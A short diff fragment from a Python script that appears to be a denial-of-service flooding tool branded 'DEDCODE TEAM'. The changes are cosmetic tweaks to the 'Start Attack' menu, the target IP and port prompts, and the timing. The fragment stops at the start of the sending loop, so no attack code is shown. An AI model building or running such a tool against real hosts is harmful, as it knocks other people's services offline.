@@ -32,17 +32,17 @@ print (Fore.GREEN + """
 """)
 
 print("З А Г Р У З К А....")
-time.sleep(1.5)
+time.sleep(2.5)
 os.system("clear")
 print("🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼")
 
-print (Fore.RED + "[1] > Start Attack\n\n[2] > Close")
-data = input("\n\n>>> Enter ( 1 - 2 ) > ")
+print (Fore.RED + "[1] > Start Attack\n[2] > Close")
+data = input("\n>>> Enter ( 1 - 2 ) > ")
 if data == "1":
 
-    ip = input("\n\n>>> Enter Target IP => ")
-    port = input("\n\n>>> Enter Port (Default 80) => ")
-    print (Fore.BLUE + "\n\nPls Wait...\n\n")
+    ip = input("\n>>> Enter Target IP => ")
+    port = input("\n>>> Enter Port (Default 80) => ")
+    print (Fore.BLUE + "\nPls Wait...\n")
     time.sleep(4)
     sent = 0
     while True:
